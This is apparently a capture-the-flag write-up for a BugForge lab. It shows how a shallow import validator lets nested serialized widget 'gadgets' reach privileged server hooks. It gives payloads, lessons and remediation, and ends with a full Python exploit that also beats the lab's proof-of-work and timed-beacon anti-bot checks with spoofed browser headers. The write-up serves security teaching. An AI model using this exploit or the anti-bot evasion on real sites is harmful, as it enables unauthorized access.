---
title: WordMess - Gadgets Inside of Gadgets
tags:
  - bugforge
  - deserialization
  - gadget-chain
  - allowlist-bypass
  - anti-bot-bypass
  - chain
aliases:
  - "/bugforge/wordmess-gadget-chain/"
---
- This time the surface is the subscriber dashboard, whose widgets are stored as a portable serialized blob of typed `gadgets`
- The import validator checks gadget types and hook names against an allowlist, but only at the top level -> a gadget nested inside another gadget's input is never validated
- The runtime hook registry is wider than the import allowlist... dispatch a privileged hook through the nested gadget and the flag renders in your own dashboard

## TL;DR

```
[1] Forgeflare anti-bot (this build adds a presence stage):
    GET  /forgeflare/challenge -> {token, n, difficulty:16}
    solve sha256(n + ':' + nonce) with >= 16 leading zero bits
    POST /forgeflare/pow       -> {bsid, interval:220, need:3}
    POST /forgeflare/beacon    -> 3 beats at ~300ms cadence (server-timed dwell)
    POST /forgeflare/verify    -> forgeflare_clearance cookie (60s TTL)

[2] Register + log in (subscriber). The profile page stores dashboard
    widgets as a "portable serialized preferences blob":  s: + JSON

[3] The import validator checks __wm_type and hook ONLY on top-level
    entries of widgets[]. A WM_Filter nested inside another WM_Filter's
    input field is rendered recursively but validated never.

[4] POST /wp-admin/profile.php with:
    s:{"widgets":[{"__wm_type":"WM_Filter","hook":"wptexturize",
       "input":{"__wm_type":"WM_Filter","hook":"wm_exec","input":"x"}}]}

    GET /wp-admin -> the widget body is the flag.
```



## The attack surface:

```
GET/POST  /wp-login.php?action=register   - self-service registration (role: always subscriber)
GET/POST  /wp-login.php                   - login
GET/POST  /wp-admin/profile.php           - widget preferences export/import (subscriber)  <-- the seam
GET       /wp-admin                       - dashboard, renders your widgets
GET/POST  /wp-json/wp/v2/*                - REST API (plugins/settings admin-only, 401)
POST      /wp-json/batch/v1               - batch endpoint
```

The profile page explains the format in its own words:

> Your layout is stored as a portable serialized preferences blob so you can back it up or move it between sites. [...] Accepts a JSON object of `{ "widgets": [ ... ] }`, or a raw `s:`-tagged blob. Imports are validated against the allowed widget types before they are saved.

And the seeded default preferences, exported from a fresh account, are the whole challenge in one artifact:

```json
s:{"widgets":[
  {"__wm_type":"WM_Widget","title":"At a Glance","content":"Welcome to your WordMess dashboard."},
  {"__wm_type":"WM_Filter","title":"Tidy Tip","hook":"wptexturize","input":"Use \"smart quotes\" -- they read nicer..."},
  {"__wm_type":"WM_Filter","title":"Featured","hook":"make_clickable",
   "input":{"__wm_type":"WM_Widget","title":"inner","content":"Docs: https://wordmess.test"}}
]}
```

- Read the third widget closely: a `WM_Filter` whose `input` is itself a `WM_Widget`. 
- **The app ships a gadget inside a gadget in its default configuration.** 
- The renderer supports nesting; that is a feature. 
- The question the challenge asks is whether the validator knows about it.


## Layer 1: The Wall (Forgeflare, with a new trick)

- Before any of this, every request has to pass Forgeflare, the anti-bot layer. 
- Previous WordMess builds used a two-step: solve a proof-of-work, POST it to `/forgeflare/verify` with fake browser telemetry, get a cookie. 
- This build adds a **presence stage** in the middle:

```
GET  /forgeflare/challenge?to=/wp-admin
     -> HTML page with <script id="ff-data">{"token":"...","n":"...","difficulty":16,...}</script>

POST /forgeflare/pow        {"token":..., "nonce":...}
     -> {"ok":true, "bsid":"...", "need":3, "interval":220}

POST /forgeflare/beacon     {"bsid":"..."}     (repeated)
     -> {"ok":true, "complete":false, "accepted":1, "need":3}
     -> ... until {"ok":true, "complete":true, "accepted":3}

POST /forgeflare/verify     {"bsid":"...", "to":"...", "hp":""}
     -> {"cleared":true, "ttl_ms":60000}  + Set-Cookie: forgeflare_clearance
```

- The PoW is unchanged: find a `nonce` such that `sha256(n + ':' + nonce)` has at least 16 leading zero bits. 
- That is about 1 in 65,536 hashes, milliseconds on a laptop. 
- The beacons are the new part: after the PoW is accepted, the server issues a beacon session ID (`bsid`) and requires a few beats at a cadence it measures itself (the page JS waits `max(interval + 80, 300)` ms between posts). 
- The dwell cannot be shortcut by claiming numbers - the server times the beats.

- The practical consequence is about tooling, not difficulty: one-shot request tools cannot hold a 300 ms cadence, and `request/response` loops that round-trip through an agent (each call costing over a second) will never beat the beacon window. 
- You need a small script that runs the loop in real time. 
- The whole handshake still completes in about two seconds, and the script at the bottom of this post does it in the standard library.

## Layer 2: The Vulnerability Class

### What is a gadget chain?

- When an application deserializes attacker-controlled **typed** objects, every type it supports becomes a *gadget*: a chunk of behaviour the attacker can instantiate with attacker-chosen fields. 
- If gadgets can reference or contain other gadgets, the attacker composes behaviours the developer never intended - a *chain*. 
- PHP's `unserialize()` POP chains are the classic version of this; Java and Python pickle have their own. 
- The language does not matter, the shape is where it's at:

1. The attacker controls a serialized structure.
2. The structure names types, and the app maps type names to code.
3. The composed objects trigger behavior when the app walks them.

This lab rebuilt this pattern in JSON, with a nod to PHP's serialize format (the `s:` tag means "string"):

```json
{"__wm_type":"WM_Widget", "title":..., "content":...}            - renders content into the dashboard
{"__wm_type":"WM_Filter", "title":..., "hook":..., "input":...}  - applies a named hook to input, renders the result
```

- `WM_Filter` is the interesting one. 
- Its `hook` field is a **string naming a server-side function**, exactly the "plugins wire named hooks" design the app's own blog post brags about. 
- Four hooks are offered for import: `wptexturize`, `make_clickable`, `wpautop`, `convert_smilies` - four cosmetic text filters borrowed from real WordPress.

### The validator, and what it actually checks

- The import endpoint validates before saving, and its rejections are precise:

```
hook "totally_bogus_hook"   -> 400 {"error":"Import rejected: filter hook \"totally_bogus_hook\" is not in the allowed list"}
type "WM_Bogus"             -> 400 {"error":"Import rejected: widget type \"WM_Bogus\" is not allowed"}
valid blob                  -> 200 {"saved":true}
```

- A few dozen requests confirm the full allowlists: two types (`WM_Widget`, `WM_Filter`), four hooks (the cosmetics above). So far, so good.
- Interesting part here is the validator. It checks the entries of the top-level `widgets` array, and `WM_Filter.input` is **polymorphic** so it accepts a string, an array, or *another gadget object*. 
- Send a filter whose input is a filter whose hook is garbage:

```json
s:{"widgets":[
  {"__wm_type":"WM_Filter","title":"outer","hook":"wptexturize",
   "input":{"__wm_type":"WM_Filter","title":"inner","hook":"totally_bogus","input":"x"}}
]}
```

```
-> 200 {"saved":true}
```

- The inner hook `totally_bogus` - rejected instantly at the top level - sails through one level down. 
- **The validator checks depth 1. The data structure is a tree.** Every node below the first level is trusted.

### Two registries

An allowlist is only as strong as the dispatch it guards. Here there are two separate lists answering the same question ("is this hook OK?"):

- the **import allowlist**: 4 cosmetic hooks, enforced (shallowly) at save time
- the **runtime hook registry**: whatever the server actually has registered, consulted by name at render time

- Nested gadgets render recursively, and their hooks dispatch against the runtime registry. 
- If a name exists there, it runs - the import allowlist is never re-consulted. 
- So the real question is... what does the runtime registry know that the import allowlist does not?

### How the renderer behaves

Before brute-forcing that, it pays to map the renderer's rules, because they explain why the obvious injections fail:

- **Filter with string input**: the input is HTML-escaped, then the hook transforms it, and the output is inserted into the page **raw** (trusted). But every allowed hook escapes its input first, so the raw sink is unreachable through them.
- **Outer hooks skip strings containing `<`**: a filter never re-processes markup another filter produced. Double-transform chains through the four cosmetics are cosmetic.
- **Filter with object input**: the filter's own hook is **skipped entirely** - the inner gadget renders instead. This is the bypass shape: the outer gadget's hook just has to pass validation; it never actually runs.
- **Filter with array input**: renders the JSON of the compiled inner gadgets, which leaks the internal compiled form `{"__wm":true,"title":...,"html":...}` - free information about the object model.
- **User-supplied `html` fields** are overwritten when the gadget compiles. **Prototype pollution** (`__proto__` keys in the blob) saves silently and does nothing.
- **Unknown hook names are silent no-ops** at render time - the widget shows its input unchanged. No error, no oracle except the output.

That last rule is what makes enumeration cheap: `a nested hook that exists changes the output; one that does not leaves it alone.`

### The runtime registry is wider

- The import accepts up to 20 widgets per blob, and the dashboard shows every widget's rendered result. 
- That is **20 oracles per POST**. 
- Brute-forcing ~80 plausible hook names through the nested bypass in four saves:

```json
{"__wm_type":"WM_Filter","title":"probe","hook":"wptexturize",
 "input":{"__wm_type":"WM_Filter","title":"inner","hook":"<candidate>","input":"x"}}
```

Most candidates come back unchanged (no such hook). Seven do not:

```
wm_exec      -> bug{foHfhuVKCYhbv6KnxLyVyXE6GqWW1EyC}
wm_include   -> bug{foHfhuVKCYhbv6KnxLyVyXE6GqWW1EyC}
wm_system    -> bug{foHfhuVKCYhbv6KnxLyVyXE6GqWW1EyC}
include      -> bug{foHfhuVKCYhbv6KnxLyVyXE6GqWW1EyC}
require      -> bug{foHfhuVKCYhbv6KnxLyVyXE6GqWW1EyC}
exec         -> bug{foHfhuVKCYhbv6KnxLyVyXE6GqWW1EyC}
spawn        -> bug{foHfhuVKCYhbv6KnxLyVyXE6GqWW1EyC}
```

- Privileged hooks, sitting in the runtime registry, reachable by name from a subscriber's preferences import.


## The Exploit, Step by Step

### Stage 0: through the wall

- The script solves the full handshake - challenge, PoW, three beacons, verify - and banks the 60-second clearance cookie. 
- From here on it is a normal authenticated session.

### Stage 1: an ordinary subscriber

```
POST /wp-login.php?action=register
     user_login=atk_x1  user_email=atk_x1@x.com  pwd=...
     -> "Registration complete. You can log in."

POST /wp-login.php
     log=atk_x1  pwd=...  redirect_to=/wp-admin
     -> 302 -> dashboard. Howdy, atk_x1 (subscriber)
```

### Stage 2: read the form

```
GET /wp-admin/profile.php
    -> _wpnonce: 154bea0355
    -> the export textarea shows the seeded blob, including the
       nested "Featured" gadget - the app's own hint
```

### Stage 3: the nested-gadget payload

```
POST /wp-admin/profile.php
     _wpnonce=154bea0355
     prefs_raw=s:{"widgets":[{"__wm_type":"WM_Filter","title":"gadget","hook":"wptexturize",
                "input":{"__wm_type":"WM_Filter","title":"inner","hook":"wm_exec","input":"x"}}]}

-> 200 {"saved":true}
```

- The outer `wptexturize` is a passport, not a payload: it passes the validator and is then skipped because its input is an object. 
- The inner `wm_exec` was never checked by anyone, and the runtime registry knows it.

### Stage 4: the flag renders in your own dashboard

```
GET /wp-admin

  <h4>gadget</h4>
  <div class="wm-widget-body">bug{foHfhuVKCYhbv6KnxLyVyXE6GqWW1EyC}</div>
```

The app renders your exploit back to you as a dashboard widget, which is a fitting end for a bug in a widget system.

## Why This Worked

1. **Validator depth (1) < data structure depth (recursive).** Every node below the top level was trusted. The single most important number in a recursive format is the depth its validator reaches.
2. **A polymorphic field was the smuggling route.** `input: string | object | array` means every consumer has to handle three shapes - and the validator handled one. If `input` had to be a string, there is no gadget nesting at all.
3. **Two registries with different membership.** The import allowlist and the runtime dispatch table answered the same question with different lists. Whatever list *dispatch* trusts is the only one that matters.
4. **Dispatch by attacker-chosen name.** No eval, no pickle, no magic methods. A JSON blob, a type tag, and a name-to-function lookup are a complete gadget system.
5. **The feature worked exactly as designed.** Nested gadgets are real - the default preferences ship one. The renderer's recursion was correct. Only the validation layer never got the memo.

## Attack Chain Diagram

```
                 +------------------------------------+
                 | Forgeflare: PoW + timed beacons    |
                 +-----------------+------------------+
                                   | clearance cookie (60s)
                                   v
                      +-------------------------+
                      | register + login         |
                      | (subscriber)             |
                      +------------+------------+
                                   |
                                   v
              +-----------------------------------------+
              | POST profile.php prefs_raw:              |
              |   outer WM_Filter hook=wptexturize       |  <- passes validator
              |   input: WM_Filter hook=wm_exec          |  <- never validated
              +---------------------+-------------------+
                                   |
                                   v
              +-----------------------------------------+
              | validator: checks top level only -> 200  |
              | renderer: recurses, dispatches inner     |
              | hook against the RUNTIME registry        |
              +---------------------+-------------------+
                                   |
                                   v
                      +-------------------------+
                      | GET /wp-admin            |
                      | widget body = the flag   |
                      +-------------------------+
```

## Lessons

1. **Validate to the same depth you recurse.** If the data structure is a tree, the validator must walk the tree - or the structure must be flattened to one level before it is trusted. "Validated at import" means every node or it means nothing.
2. **Two registries with different membership is a bypass by construction.** If import checks list A and dispatch consults list B, then everything in B-minus-A is reachable by anyone who can slip past the import check. The fix is one registry, checked at dispatch time.
3. **Polymorphic fields are gadget smugglers.** `input: string|object|array` triples the validation surface. Make the boundary type strict, and whole classes of nesting bugs die at the door.
4. **An allowlist on names is only as strong as the shallowest path to dispatch.** The four cosmetic hooks were a fine policy. The policy was just never applied where it counted.
5. **Gadget chains do not need eval.** Any time users can define typed objects that reference server-side functions by name, you have a gadget system whether you call it that or not - and it deserves the same paranoia as `unserialize()`.
6. **Validators make good oracles.** The 200/400 split enumerated the allowlists in a few dozen requests, and the same channel enumerated the runtime registry 20 names per POST. Precise error messages are a UX feature and a reconnaissance feature at the same time.

## Remediation

- **Recursive validation**: walk every node of the gadget tree and validate type and hook at each node, or flatten nested gadgets to one level at parse time and reject anything deeper.
- **One registry**: tag hooks as importable or internal at registration time, and check that tag at dispatch time, not just at import time. Internal hooks should be unreachable by name from user data even if a validator bug lets the name through.
- **Monomorphic input**: if a filter's input must be a string, reject non-strings. If nesting is genuinely needed, make it an explicit, separately validated structure with its own depth limit.
- **Keep the size limits, add a depth limit**: the existing 20-widget cap is good hygiene. A max nesting depth of 1 would have killed this chain outright.

## The Script

The script below is self-contained - standard library only, no dependencies, no setup. It is written to be read as much as run: every block has a comment saying what it does and why.

What you need: Python 3.8 or newer, and a lab URL.

```bash
python3 wordmess_gadget_chain.py https://lab-XXXX.labs-app.bugforge.io
```

That is the whole interface. The run produces:

```
[*] Forgeflare cleared (PoW + beacons)
[*] Registering atk_4veibl (subscriber) ...
[*] Importing nested-gadget preferences blob ...
[+] FLAG: bug{foHfhuVKCYhbv6KnxLyVyXE6GqWW1EyC}
```

### The script, explained

- `LabSession.solve_forgeflare` - the hardened anti-bot handshake. Challenge JSON out of the page, the SHA-256 lottery, then the part earlier builds did not have: a beacon loop that has to beat at the server's cadence before `/forgeflare/verify` will clear you.
- `exploit`, Step 3 - the payload. The outer `WM_Filter` carries `wptexturize` purely to pass the validator; its hook is skipped at render because its input is an object. The inner `WM_Filter` carries `wm_exec`, which no validator ever saw.
- Step 4 - the flag is scraped out of your own dashboard HTML with a regex.

```python
#!/usr/bin/env python3
"""
wordmess_gadget_chain.py - self-contained exploit for the BugForge "WordMess
weekly" lab (nested gadget chain in the dashboard-widget preferences import).

Chain: beat the Forgeflare anti-bot (proof-of-work + timed presence beacons)
-> register a subscriber -> log in -> import a preferences blob whose top-level
gadget passes validation while a NESTED gadget carries an arbitrary hook name
-> the runtime hook registry dispatches the privileged hook -> the flag renders
in your own dashboard.

Only uses the Python standard library. Python 3.8+.

Usage:
    python3 wordmess_gadget_chain.py https://lab-XXXX.labs-app.bugforge.io
"""
import hashlib, json, random, re, string, sys, time
import urllib.request, urllib.error, urllib.parse
import http.cookiejar

# A script-like User-Agent is rejected by Forgeflare before you ever see the
# puzzle, so every request carries a full browser header set.
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")


class LabSession:
    """HTTP session that solves the hardened Forgeflare handshake once, then
    keeps the clearance + login cookies in a jar like a browser would."""

    def __init__(self, base_url):
        self.base = base_url.rstrip("/")
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))

    # -- raw HTTP -----------------------------------------------------------
    def _http(self, path, method="GET", data=None, json_body=None):
        h = {"User-Agent": UA,
             "Accept": "text/html,application/json,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9",
             "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-Dest": "document"}
        body = None
        if json_body is not None:
            body = json.dumps(json_body).encode()
            h["Content-Type"] = "application/json"
        elif data is not None:
            body = urllib.parse.urlencode(data).encode()
            h["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(self.base + path, data=body,
                                     method=method, headers=h)
        try:
            r = self.opener.open(req, timeout=20)
            return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")

    # -- Forgeflare: proof-of-work + timed beacons ---------------------------
    @staticmethod
    def _leading_zero_bits(hexdigest):
        bits = 0
        for ch in hexdigest:
            nib = int(ch, 16)
            if nib == 0:
                bits += 4
                continue
            bits += 3 if nib < 2 else 2 if nib < 4 else 1 if nib < 8 else 0
            break
        return bits

    def solve_forgeflare(self, to="/wp-admin"):
        """This build of Forgeflare is hardened vs earlier WordMess labs:
        after the PoW is accepted you must keep a presence beacon beating at
        a server-measured cadence before /verify will clear you. The dwell
        cannot be faked - the server times the beats."""
        # 1. Challenge page embeds {token, n, difficulty, to} as JSON.
        st, html = self._http(f"/forgeflare/challenge?to={urllib.parse.quote(to)}")
        ff = json.loads(re.search(
            r'<script id="ff-data"[^>]*>(.*?)</script>', html, re.S).group(1))

        # 2. PoW: sha256(n + ':' + nonce) with >= difficulty leading zero bits.
        #    Difficulty 16 ~ 1 in 65,536 hashes ~ well under a second.
        nonce = 0
        while True:
            d = hashlib.sha256(f"{ff['n']}:{nonce}".encode()).hexdigest()
            if self._leading_zero_bits(d) >= ff["difficulty"]:
                break
            nonce += 1

        # 3. PoW accepted -> beacon session {bsid, interval, need}.
        st, body = self._http("/forgeflare/pow", method="POST",
                              json_body={"token": ff["token"], "nonce": nonce})
        powd = json.loads(body)
        assert powd.get("ok"), f"pow rejected: {powd}"
        bsid = powd["bsid"]
        cadence = max(powd.get("interval", 220) + 80, 300) / 1000.0

        # 4. Beacons: real-time loop until the server says the dwell is done.
        for _ in range(60):
            time.sleep(cadence)
            st, body = self._http("/forgeflare/beacon", method="POST",
                                  json_body={"bsid": bsid})
            d = json.loads(body)
            if not d.get("ok"):
                raise RuntimeError(f"beacon rejected: {d}")
            if d.get("complete"):
                break

        # 5. Verify -> forgeflare_clearance cookie lands in the jar (60s TTL).
        st, body = self._http("/forgeflare/verify", method="POST",
                              json_body={"bsid": bsid, "to": ff["to"], "hp": ""})
        assert json.loads(body).get("cleared"), f"verify failed: {body}"
        print("[*] Forgeflare cleared (PoW + beacons)")

    # -- app helpers ----------------------------------------------------------
    def get(self, path):
        return self._http(path)

    def post_form(self, path, fields):
        return self._http(path, "POST", data=fields)


def exploit(base):
    s = LabSession(base)

    # -- Step 0: through the wall ---------------------------------------------
    s.solve_forgeflare(to="/wp-admin")

    # -- Step 1: an ordinary subscriber ---------------------------------------
    user = "atk_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    pwd = "Str0ngPass!x"
    print(f"[*] Registering {user} (subscriber) ...")
    s.post_form("/wp-login.php?action=register",
                {"user_login": user, "user_email": f"{user}@x.com", "pwd": pwd})
    st, page = s.post_form("/wp-login.php",
                           {"log": user, "pwd": pwd, "redirect_to": "/wp-admin"})
    assert "Howdy" in page, "login failed"

    # -- Step 2: read the profile form (CSRF nonce) ----------------------------
    # The profile page stores dashboard widgets as a "portable serialized
    # preferences blob": the letter s:, then JSON. The seeded defaults already
    # contain a gadget inside a gadget (a WM_Filter whose input is a WM_Widget),
    # which is the hint made flesh.
    st, page = s.get("/wp-admin/profile.php")
    nonce = re.search(r'name="_wpnonce" value="([0-9a-f]+)"', page).group(1)

    # -- Step 3: the nested-gadget payload -------------------------------------
    # The import validator checks __wm_type and hook ONLY on top-level entries
    # of widgets[]. A WM_Filter nested inside another WM_Filter's input field
    # is rendered recursively but validated never - so the INNER hook name can
    # be anything the runtime registry knows. The outer hook just has to be one
    # of the four import-allowed cosmetics (wptexturize here) to pass the gate.
    payload = {"widgets": [
        {"__wm_type": "WM_Filter", "title": "gadget", "hook": "wptexturize",
         "input": {"__wm_type": "WM_Filter", "title": "inner",
                   "hook": "wm_exec", "input": "x"}}
    ]}
    blob = "s:" + json.dumps(payload)
    print("[*] Importing nested-gadget preferences blob ...")
    st, body = s.post_form("/wp-admin/profile.php",
                           {"_wpnonce": nonce, "prefs_raw": blob})
    assert st == 200 and '"saved":true' in body, f"import rejected: {body[:200]}"

    # -- Step 4: the flag renders in your own dashboard -------------------------
    st, page = s.get("/wp-admin")
    m = re.search(r'bug\{[^}]+\}', page)
    if not m:
        print("[!] chain completed but no flag in the dashboard")
        return None
    return m.group(0)


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>", file=sys.stderr)
        sys.exit(2)
    flag = exploit(sys.argv[1])
    if flag:
        print(f"[+] FLAG: {flag}")
        sys.exit(0)
    sys.exit(1)


if __name__ == "__main__":
    main()
```

### Reading order

If you want to understand the chain rather than just run it:

1. `LabSession.solve_forgeflare` - the anti-bot handshake, including the timed beacon stage that breaks one-shot tooling.
2. `exploit`, Step 3 - the nested-gadget payload, and the comment explaining why the outer hook is a passport rather than a payload.
3. `LabSession._leading_zero_bits` - fifteen lines that are the entire proof-of-work.

If you just want the flag, run the script. It handles the wall, the accounts, the nonce, and the import, and prints the flag out of your own dashboard.
